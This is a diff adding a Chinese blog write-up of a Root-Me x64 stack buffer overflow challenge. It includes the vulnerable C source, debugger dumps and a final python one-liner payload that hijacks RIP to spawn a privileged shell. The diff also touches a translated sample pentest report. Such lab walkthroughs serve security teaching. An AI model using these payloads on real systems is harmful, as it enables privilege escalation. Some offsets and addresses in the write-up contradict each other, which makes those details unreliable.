@@ -1134,6 +1134,91 @@ fp.close()</code></pre>
       </tags>
   </entry>
   <entry>
+    <title>Stack buffer overflow - basic</title>
+    <url>/2020/11/24/Stack-buffer-overflow-basic/</url>
+    <content><![CDATA[<h2 id="ELF-x64-Stack-buffer-overflow-basic"><a href="#ELF-x64-Stack-buffer-overflow-basic" class="headerlink" title="ELF x64 - Stack buffer overflow - basic"></a>ELF x64 - Stack buffer overflow - basic</h2><p><em>gdb 内 查看函数</em></p>
+<p><code>info functions</code></p>
+<pre><code>0x0000000000401152  callMeMaybe
+0x0000000000401193  main</code></pre>
+<a id="more"></a>
+<hr>
+<p>ret 后<br>会将rsp指向的内容压入RIP，转移程序执行流</p>
+<hr>
+<p>题目源代码</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">gcc -o ch35 ch35.c -fno-stack-protector -no-pie -Wl,-z,relro,-z,now,-z,noexecstack</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">callMeMaybe</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *argv[] = &#123; <span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;-p&quot;</span>, <span class="literal">NULL</span> &#125;;</span><br><span class="line">    execve(argv[<span class="number">0</span>], argv, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span>&#123;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">char</span> buffer[<span class="number">256</span>];</span><br><span class="line">    <span class="keyword">int</span> len, i;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, buffer);</span><br><span class="line">    len = <span class="built_in">strlen</span>(buffer);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello %s\n&quot;</span>, buffer);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="主要思路："><a href="#主要思路：" class="headerlink" title="主要思路："></a>主要思路：</h3><p><a href="http://repository.root-me.org/Exploitation%20-%20Syst%C3%A8me/Unix/EN%20-%2064%20Bits%20Linux%20Stack%20Based%20Buffer%20Overflow.pdf">http://repository.root-me.org/Exploitation%20-%20Syst%C3%A8me/Unix/EN%20-%2064%20Bits%20Linux%20Stack%20Based%20Buffer%20Overflow.pdf</a><br>根据这篇文章<br>通过溢出来控制RIP，将其指向我们想要的函数</p>
+<ol>
+<li>先向buffer中输入字符，执行到<code>ret</code>时，查看<code>RSP</code>的值，确定需要多少位可以溢出到<code>RSP</code>位</li>
+<li>可以确定需要<code>0x110</code> 即<code>280</code>位，之后添加的字符就会输入进<code>RIP</code>中</li>
+<li>我们需要的是执行<code>callMeMaybe()</code>，所以将函数地址倒序添加进末尾（因为小端序）</li>
+</ol>
+<hr>
+<h3 id="查看函数地址"><a href="#查看函数地址" class="headerlink" title="查看函数地址"></a>查看函数地址</h3><pre><code>[0x00401193]&gt; fs symbols;f
+0x00401000 23 sym._init
+0x00401070 42 entry0
+0x00401070 43 sym._start
+0x004010a0 1 sym._dl_relocate_static_pie
+0x004010b0 33 sym.deregister_tm_clones
+0x004010e0 49 sym.register_tm_clones
+0x00401120 33 entry.fini0
+0x00401120 0 sym.__do_global_dtors_aux
+0x00401150 2 entry.init0
+0x00401150 0 sym.frame_dummy
+0x00401152 65 sym.callMeMaybe
+0x00401193 103 main
+0x00401193 103 sym.main</code></pre>
+<h3 id="“a”-280-”B”-6"><a href="#“a”-280-”B”-6" class="headerlink" title="“a”*280+”B”*6"></a>“a”*280+”B”*6</h3><pre><code>gdb-peda$ x/290xb $rbp-0x110
+0x7fffffffdb80:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
+0x7fffffffdb88:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
+0x7fffffffdb90:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
+0x7fffffffdb98:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
+0x7fffffffdba0:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
+0x7fffffffdba8:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
+0x7fffffffdbb0:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
+0x7fffffffdbb8:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
+0x7fffffffdbc0:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
+0x7fffffffdbc8:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
+0x7fffffffdbd0:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
+0x7fffffffdbd8:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
+0x7fffffffdbe0:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
+0x7fffffffdbe8:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
+0x7fffffffdbf0:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
+0x7fffffffdbf8:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
+0x7fffffffdc00:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
+0x7fffffffdc08:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
+0x7fffffffdc10:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
+0x7fffffffdc18:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
+0x7fffffffdc20:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
+0x7fffffffdc28:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
+0x7fffffffdc30:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
+0x7fffffffdc38:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
+0x7fffffffdc40:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
+0x7fffffffdc48:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
+0x7fffffffdc50:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
+0x7fffffffdc58:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
+0x7fffffffdc60:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
+0x7fffffffdc68:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
+0x7fffffffdc70:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
+0x7fffffffdc78:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
+0x7fffffffdc80:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
+0x7fffffffdc88:    0x61    0x61    0x61    0x61    0x1e    0x01    0x00    0x00
+0x7fffffffdc90:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
+0x7fffffffdc98:    0x42    0x42    0x42    0x42    0x42    0x42    0x00    0x00
+0x7fffffffdca0:    0x88    0xdd</code></pre>
+<hr>
+<p>成功控制RIP<br>RSP: 0x7fffffffdc98 –&gt; 0x424242424242 (‘BBBBBB’)<br>Invalid $PC address: 0x424242424242</p>
+<p>最后的payload:<br><code>(python -c &#39;print &quot;A&quot; * 280  + &quot;\xe7\x05\x40\x00\x00\x00\x00\x00&quot;&#39; ; cat ) | ./ch35</code></p>
+]]></content>
+      <categories>
+        <category>APP system in root_me</category>
+      </categories>
+      <tags>
+        <tag>PWN</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Stack buffer overflow basic 2</title>
     <url>/2020/11/14/Stack_buffer_overflow_basic_2/</url>
     <content><![CDATA[<h2 id="ELF-x86-Stack-buffer-overflow-basic-2"><a href="#ELF-x86-Stack-buffer-overflow-basic-2" class="headerlink" title="ELF x86 - Stack buffer overflow basic 2"></a>ELF x86 - Stack buffer overflow basic 2</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">shell</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    setreuid(geteuid(), geteuid());</span><br><span class="line">    system(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sup</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hey dude ! Waaaaazzaaaaaaaa ?!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> var;</span><br><span class="line">    <span class="keyword">void</span> (*func)()=sup;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">128</span>];</span><br><span class="line">    fgets(buf,<span class="number">133</span>,<span class="built_in">stdin</span>);</span><br><span class="line">    func();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
@@ -2872,7 +2957,7 @@ dmm   List modules of target process
 <h3 id="补丁管理"><a href="#补丁管理" class="headerlink" title="补丁管理"></a>补丁管理</h3><p>级别：高<br>描述：MegaCorp One内外部环境中有许多未打补丁的系统和程序。<br>影响：弱授权机制和未打补丁的主机，都包含可以用爆破的漏洞，这会使得攻击者以未授权的方式得到大量的公司资产。特别地，例如SQLiite Manager包含远程执行代码的漏洞，底层主机也有一个本地提权的漏洞，这些可以使对外开放的主机轻易地被攻陷。表明了补丁管理策略以及强制执行的不足。<br>修复：所有的公司资产都要及时打上供应商提供的补丁。要完成这些可以使用供应商官方工具或者第三方程序，这些都能检查出未应用的补丁。在许多例子中，第三方工具也可以用来在一个混乱的环境中进行补丁部署。</p>
 <h3 id="DNS区域传送"><a href="#DNS区域传送" class="headerlink" title="DNS区域传送"></a>DNS区域传送</h3><p>级别：低<br>描述：一个错误配置的DNS服务器允许无限制的区域传送。<br>影响：一个配置成可与任何DNS服务器传输数据的DNS服务器，会泄露关于公司资产和网络布局等敏感信息。<br>修复：DNS区域传送需仅对已证明的服务器开放。</p>
 <h3 id="默认APACHE文件目录"><a href="#默认APACHE文件目录" class="headerlink" title="默认APACHE文件目录"></a>默认APACHE文件目录</h3><p>级别：低<br>描述：在admin.megacorpone.com主机上发现了默认的Apache文件目录。<br>影响：攻击者通过检查默认文件夹可能猜出Apache服务器的版本。敏感信息也可能泄露。<br>修复：移除公开网站的所有默认文件。</p>
-<h2 id="附录B-关于Offensive-Security"><a href="#附录B-关于Offensive-Security" class="headerlink" title="附录B:关于Offensive Security"></a>附录B:关于Offensive Security</h2><p>Offensive Security提倡黑盒渗透测试而反对白盒渗透测试。白盒渗透测试近几年来很火，因为在仅要实现常规需求的地方，简化了评估方法。其作为漏洞扫描方法，会有选择的确认发现的问题。这让服务供应商有能力扩大工作量，因为使用了自动化的工具，并且通过证书维持产品间的联动。<br>黑盒是在受控环境下的攻击模拟形式，非常接近现实环境，组织会时不时的面临攻击。黑盒测试是基于目标的评估方法，不仅仅是发现一个简单的漏洞，而是提供一个漏洞真正的商业影响。黑盒测试会找到那些修复后能带来最高商业回报的区域。<br>黑盒测试通常需要很高的专业知识。正如报告中显示的那样，Offensive Security坚信当进行黑盒测试时输出正确有效的结果是检验合格的唯一方式，因为我们专业的安全团队运用了很高专业知识。Offensive Security会集中力量进行渗透测试或着其他参与的项目。这意味着无论什么都参与到提供服务中，例如标准工具Kali Linux，畅销书的作者，O-day漏洞的发现者，或是如Exploit-DB的维护者。<br>Offensive Security提供的产品与市场需求不配对。然而，我们不会适合任一工作。Offensive Security特别提供咨询服务，底容量和高质量的比例使得员工能更接近的模拟现实世界的攻击。这也允许在保持成本合理的同时，客户可以更多地获得行业认可的专业知识。例如，大批量/快速周转服务通常不适合我们。Offensive Security专注与领导高质量，高影响的评估活动，积极地寻求其他供应商无法提供服务的客户。<br>请通过<a href="mailto:&#105;&#110;&#102;&#111;&#x40;&#111;&#x66;&#x66;&#115;&#x65;&#99;&#46;&#x63;&#x6f;&#x6d;">&#105;&#110;&#102;&#111;&#x40;&#111;&#x66;&#x66;&#115;&#x65;&#99;&#46;&#x63;&#x6f;&#x6d;</a>联系我们。</p>
+<h2 id="附录B-关于Offensive-Security"><a href="#附录B-关于Offensive-Security" class="headerlink" title="附录B:关于Offensive Security"></a>附录B:关于Offensive Security</h2><p>Offensive Security提倡黑盒渗透测试而反对白盒渗透测试。白盒渗透测试近几年来很火，因为在仅要实现常规需求的地方，简化了评估方法。其作为漏洞扫描方法，会有选择的确认发现的问题。这让服务供应商有能力扩大工作量，因为使用了自动化的工具，并且通过证书维持产品间的联动。<br>黑盒是在受控环境下的攻击模拟形式，非常接近现实环境，组织会时不时的面临攻击。黑盒测试是基于目标的评估方法，不仅仅是发现一个简单的漏洞，而是提供一个漏洞真正的商业影响。黑盒测试会找到那些修复后能带来最高商业回报的区域。<br>黑盒测试通常需要很高的专业知识。正如报告中显示的那样，Offensive Security坚信当进行黑盒测试时输出正确有效的结果是检验合格的唯一方式，因为我们专业的安全团队运用了很高专业知识。Offensive Security会集中力量进行渗透测试或着其他参与的项目。这意味着无论什么都参与到提供服务中，例如标准工具Kali Linux，畅销书的作者，O-day漏洞的发现者，或是如Exploit-DB的维护者。<br>Offensive Security提供的产品与市场需求不配对。然而，我们不会适合任一工作。Offensive Security特别提供咨询服务，底容量和高质量的比例使得员工能更接近的模拟现实世界的攻击。这也允许在保持成本合理的同时，客户可以更多地获得行业认可的专业知识。例如，大批量/快速周转服务通常不适合我们。Offensive Security专注与领导高质量，高影响的评估活动，积极地寻求其他供应商无法提供服务的客户。<br>请通过<a href="mailto:&#105;&#x6e;&#x66;&#x6f;&#x40;&#x6f;&#x66;&#x66;&#x73;&#x65;&#99;&#46;&#x63;&#x6f;&#109;">&#105;&#x6e;&#x66;&#x6f;&#x40;&#x6f;&#x66;&#x66;&#x73;&#x65;&#99;&#46;&#x63;&#x6f;&#109;</a>联系我们。</p>
 ]]></content>
       <tags>
         <tag>penetation test</tag>
